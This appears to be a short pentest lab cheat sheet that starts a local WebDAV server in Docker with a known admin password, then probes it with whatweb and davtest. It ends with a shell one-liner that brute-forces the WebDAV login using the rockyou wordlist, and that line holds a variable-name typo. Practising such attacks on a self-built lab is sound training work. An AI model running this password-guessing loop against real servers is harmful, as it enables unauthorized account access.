### webDAV
```bash
https://hub.docker.com/r/bytemark/webdav/

docker pull bytemark/webdav

docker run --restart always -v /srv/dav:/var/lib/dav \
    -e AUTH_TYPE=Digest -e USERNAME=admin -e PASSWORD=richard \
    --publish 80:80 -d bytemark/webdav

whatweb localhost:80

>
davtest -url http://127.0.0.1 -auth admin:admin 2>&1

davtest -url http://127.0.0.1 -auth admin:richard 2>&1

cat /usr/share/wordlists/rockyou.txt | while read password; do reponse=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[!] The password is: $password"; break; fi; done




```